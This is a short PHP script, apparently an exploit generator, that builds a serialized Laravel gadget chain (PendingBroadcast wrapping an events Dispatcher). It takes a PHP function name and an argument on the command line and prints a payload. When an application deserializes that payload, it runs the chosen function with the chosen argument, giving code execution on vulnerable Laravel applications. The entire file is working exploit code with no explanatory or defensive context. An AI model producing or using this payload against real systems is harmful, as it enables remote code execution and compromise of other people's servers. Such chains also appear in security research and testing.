<?php


namespace Illuminate\Broadcasting
{
    class PendingBroadcast
    {
        protected $events;
        protected $event;

        function __construct($events, $parameter)
        {
            $this->events = $events;
            $this->event = $parameter;
        }
    }
}


namespace Illuminate\Events
{
    class Dispatcher
    {
        protected $listeners;

        function __construct($function, $parameter)
        {
            $this->listeners = [
                $parameter => [$function]
            ];
        }
    }
}

namespace Y4tacker
{

    class Exp
    {
        public function generate($function, $parameter)
        {

            return serialize(new \Illuminate\Broadcasting\PendingBroadcast(
                new \Illuminate\Events\Dispatcher($function, $parameter),
                $parameter
            ));
        }
    }
}

namespace {
    $function = $argv[1];
    $parameter = $argv[2];
    $a = new \Y4tacker\Exp();
    $b = $a->generate($function,$parameter);
    echo $b;

}